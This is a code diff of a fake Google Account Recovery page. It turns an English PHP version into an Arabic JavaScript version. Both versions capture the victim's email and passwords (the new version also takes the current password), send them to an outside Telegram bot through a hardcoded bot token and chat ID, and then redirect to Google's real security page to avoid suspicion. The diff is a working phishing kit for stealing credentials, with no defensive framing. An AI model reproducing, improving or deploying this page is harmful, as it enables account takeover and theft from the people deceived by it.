@@ -1,30 +1,12 @@
-<?php
-if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    $email = htmlspecialchars($_POST['email']);
-    $password = htmlspecialchars($_POST['password']);
-
-    $token = "7974833718:AAEkJZ66-Sz_m8uP663whBH2yTmktnCGmP4"; // بدّل دي بالتوكن الحقيقي
-    $chat_id = "6817512459"; // بدّل دي بـ chat_id الحقيقي
-    $text = "Google Reset Attempt:%0AEmail: $email%0APassword: $password";
-
-    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$text";
-
-    file_get_contents($url);
-
-    header('Location: https://myaccount.google.com/security-checkup');
-    exit();
-}
-?>
-
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>Google Account Recovery</title>
+  <title>استعادة حساب Google</title>
   <style>
     body {
       background: #f2f2f2;
-      font-family: 'Roboto', sans-serif;
+      font-family: 'Arial', sans-serif;
     }
 
     .container {
@@ -34,7 +16,12 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
       padding: 40px;
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      text-align: center;
+      text-align: right;
+    }
+
+    .container img {
+      display: block;
+      margin: 0 auto 20px;
     }
 
     input {
@@ -43,6 +30,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
       margin: 12px 0;
       border: 1px solid #ccc;
       border-radius: 4px;
+      direction: ltr;
     }
 
     button {
@@ -60,12 +48,56 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 <body>
   <div class="container">
     <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
-    <h2>Account Recovery</h2>
-    <form method="POST">
-      <input type="email" name="email" placeholder="Enter your email" required>
-      <input type="password" name="password" placeholder="Enter your new password" required>
-      <button type="submit">Continue</button>
+    <h2>استعادة الحساب</h2>
+    <form id="recoveryForm">
+      <label>البريد الإلكتروني</label>
+      <input type="email" name="email" required>
+
+      <label>كلمة المرور الحالية</label>
+      <input type="password" name="current" required>
+
+      <label>كلمة المرور الجديدة</label>
+      <input type="password" name="new" required>
+
+      <label>تأكيد كلمة المرور الجديدة</label>
+      <input type="password" name="confirm" required>
+
+      <button type="submit">متابعة</button>
     </form>
   </div>
+
+  <script>
+    document.getElementById('recoveryForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = this.email.value;
+      const current = this.current.value;
+      const newPass = this.new.value;
+      const confirm = this.confirm.value;
+
+      const token = '7974833718:AAEkJZ66-Sz_m8uP663whBH2yTmktnCGmP4'; // حط التوكن هنا
+      const chat_id = '6817512459'; // حط ال chat ID هنا
+      const text = `
+محاولة استعادة حساب Google:
+البريد الإلكتروني: ${email}
+كلمة المرور الحالية: ${current}
+كلمة المرور الجديدة: ${newPass}
+تأكيد كلمة المرور: ${confirm}
+      `;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: text
+        })
+      }).then(() => {
+        window.location.href = 'https://myaccount.google.com/security-checkup';
+      });
+    });
+  </script>
 </body>
 </html>
